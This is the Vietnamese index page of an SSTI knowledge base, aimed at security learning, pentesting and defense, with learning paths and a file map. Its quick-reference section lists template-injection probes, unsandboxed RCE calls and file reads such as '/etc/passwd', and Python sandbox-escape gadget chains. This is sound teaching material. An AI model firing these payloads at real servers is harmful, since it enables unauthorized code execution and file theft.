# SSTI Knowledge Base - Chỉ Mục

## Giới Thiệu

Knowledge Base này cung cấp một tài liệu toàn diện về Server-Side Template Injection (SSTI), bao gồm:

- **Kiến thức cơ bản** về cách template engine hoạt động
- **Phân tích chi tiết** về nguyên nhân và điều kiện hình thành lỗ hổng
- **Quy trình phát hiện** từ fuzzing đến xác định template engine
- **Kỹ thuật khai thác** chi tiết cho từng template engine
- **Bypass sandbox** để escalate sang RCE
- **Phòng chống** bằng secure architecture và configuration
- **Automation tools** cho pentest hoặc security scanning

## Bản Đồ Tài Liệu

### Phần I: Nền Tảng Lý Thuyết

| File                                                         | Nội Dung                                  | Độ Sâu     |
| ------------------------------------------------------------ | ----------------------------------------- | ---------- |
| [00-overview.md](00-overview.md)                             | Tổng quan SSTI, định nghĩa, tác động      | Cơ bản     |
| [01-fundamentals.md](01-fundamentals.md)                     | Hoạt động template engine, cú pháp, scope | Trung bình |
| [02-vulnerability-analysis.md](02-vulnerability-analysis.md) | Nguyên nhân lỗ hổng, điều kiện, context   | Trung bình |

### Phần II: Kỹ Thuật Phát Hiện & Xác Định

| File                                                             | Nội Dung                                         | Độ Sâu     |
| ---------------------------------------------------------------- | ------------------------------------------------ | ---------- |
| [03-detection-identification.md](03-detection-identification.md) | Fuzzing, decision tree, error analysis, polyglot | Trung bình |

### Phần III: Kỹ Thuật Khai Thác

| File                                                           | Nội Dung                       | Độ Sâu |
| -------------------------------------------------------------- | ------------------------------ | ------ |
| [04-exploitation-techniques.md](04-exploitation-techniques.md) | Quy trình chung, patterns, RCE | Cao    |

### Phần IV: Khai Thác Theo Template Engine

| File                                           | Engine     | Ngôn Ngữ | Tính Năng                           |
| ---------------------------------------------- | ---------- | -------- | ----------------------------------- |
| [09-jinja2-python.md](09-jinja2-python.md)     | Jinja2     | Python   | Flask, Django; object introspection |
| [11-mako-python.md](11-mako-python.md)         | Mako       | Python   | Embedded Python; direct code exec   |
| [13-twig-php.md](13-twig-php.md)               | Twig       | PHP      | Symfony; filter callbacks           |
| [15-freemarker-java.md](15-freemarker-java.md) | FreeMarker | Java     | Enterprise; reflection chains       |
| [17-erb-ruby.md](17-erb-ruby.md)               | ERB        | Ruby     | Rails; system commands              |

### Phần V: Nâng Cao

| File                                                 | Nội Dung                                | Độ Sâu     |
| ---------------------------------------------------- | --------------------------------------- | ---------- |
| [19-sandbox-bypass.md](19-sandbox-bypass.md)         | Bypass techniques, gadget chains        | Rất cao    |
| [20-defense-mitigation.md](20-defense-mitigation.md) | Secure architecture, config, monitoring | Cao        |
| [21-automation-tools.md](21-automation-tools.md)     | Tplmap, TInjA, SSTImap, custom scripts  | Trung bình |

## Learning Paths (Đường Học Tập)

### Beginner (Cơ Bản)

Muốn hiểu tổng quan về SSTI:

1. [00-overview.md](00-overview.md) - Hiểu khái niệm
2. [01-fundamentals.md](01-fundamentals.md) - Học cơ bản template engine
3. [03-detection-identification.md](03-detection-identification.md) - Làm quen phát hiện
4. [04-exploitation-techniques.md](04-exploitation-techniques.md) - Bài toán cơ bản RCE

**Thời gian:** 2-3 giờ

### Intermediate (Trung Bình)

Muốn praktis SSTI:

1. Tất cả từ Beginner
2. [02-vulnerability-analysis.md](02-vulnerability-analysis.md) - Hiểu nguyên nhân sâu hơn
3. Chọn 2-3 template engine từ Phần IV (ví dụ: Jinja2, Twig)
4. [20-defense-mitigation.md](20-defense-mitigation.md) - Hiểu phòng chống
5. [21-automation-tools.md](21-automation-tools.md) - Setup tools

**Thời gian:** 5-7 giờ

### Advanced (Nâng Cao)

Muốn trở thành SSTI expert:

1. Tất cả từ Intermediate
2. Tất cả template engine trong Phần IV
3. [19-sandbox-bypass.md](19-sandbox-bypass.md) - Master bypass techniques
4. Thực hành với tools
5. Contribute to PayloadsAllTheThings

**Thời gian:** 15-20 giờ

## Mục Đích Sử Dụng

### Để Học Tập

- Đọc tuần tự từ phần I đến phần v
- Làm note khi học
- Thực hành payloads trên CTF/lab
- Lab recommendation: PortSwigger Web Security Academy (SSTI labs)

### Để Pentest

- Dùng [03-detection-identification.md](03-detection-identification.md) cho discovery
- Refer [04-exploitation-techniques.md](04-exploitation-techniques.md) cho exploitation
- Dùng [21-automation-tools.md](21-automation-tools.md) để automate

### Để Secure Code

- Xem [02-vulnerability-analysis.md](02-vulnerability-analysis.md) để hiểu lỗi
- Implement recommendations từ [20-defense-mitigation.md](20-defense-mitigation.md)
- Setup rules từ [21-automation-tools.md](21-automation-tools.md)

### Để Agent Training

- Knowledge base này dùng làm training data cho AI agents
- Format structured, clear methodology, detailed examples
- Agents có thể learn detection, exploitation, defense

## Cách Tổ Chức Tài Liệu

### Naming Convention

```
NN-<topic-name>.md
NN = 00-21 (ordering)

00-09: Foundation & Fundamentals
10-18: Template Engines (10-Jinja2, 11-Mako, 13-Twig, 15-FreeMarker, 17-ERB)
19-21: Advanced Topics
```

### Cấu Trúc Mỗi File

- **Tổng Quan** - Quick overview
- **Cú Pháp** - Template syntax
- **SSTI Detection** - Làm sao phát hiện
- **Payloads** - Các exploit cụ thể
- **Data Exfiltration** - Đọc dữ liệu
- **Reverse Shell** - Interactive shell
- **Obfuscation** - Bypass filter
- **Security Config** - Cách bảo vệ
- **Tài Liệu Liên Quan** - Cross-references

## Quick Reference

### Detection Payloads

```
{{ 7*7 }}           # Jinja2, Twig, Handlebars, Django
${ 7*7 }            # Mako, Velocity, SpEL
<% 7*7 %>           # ERB, EJS, JSP
[% 7*7 %]           # Liquid, Perl Template
<#assign x=7*7>${x} # FreeMarker
```

### RCE Payloads (Unsandboxed)

```python
# Python
__import__('os').system('id')
open('/etc/passwd').read()

# PHP
system('id')
exec('id')

# Java
Runtime.getRuntime().exec('id')

# Ruby
system('id')
`id`

# JavaScript
require('child_process').exec('id')
```

### Object Introspection (Bypass)

```python
# Python sandbox bypass
''.__class__.__bases__[0].__subclasses__()[X].__init__.__globals__['os'].system('id')

# Using filters/getattr
cycler|attr('__init__')|attr('__globals__')['os'].system('id')
```

## Cập Nhật & Maintenance

- Knowledge base cập nhật theo các CVE mới
- Payloads được verify thường xuyên
- Tools được update follow latest versions
- Community contributions welcome

## Resources Tham Khảo

- **PortSwigger Research**: Server-Side Template Injection (RCE for the Modern Web App)
- **OWASP**: Testing for SSTI (WSTG-INPV-18)
- **PayloadsAllTheThings**: GitHub repo với payloads
- **Tplmap**: Automatic SSTI detection tool
- **CVE Database**: Template engine CVEs

## Liên Hệ & Đóng Góp

Nếu có improvement suggestions hoặc corrections, vui lòng contribute!

---

**Last Updated:** April 2026
**Version:** 1.0
**Language:** Tiếng Việt (Vietnamese)
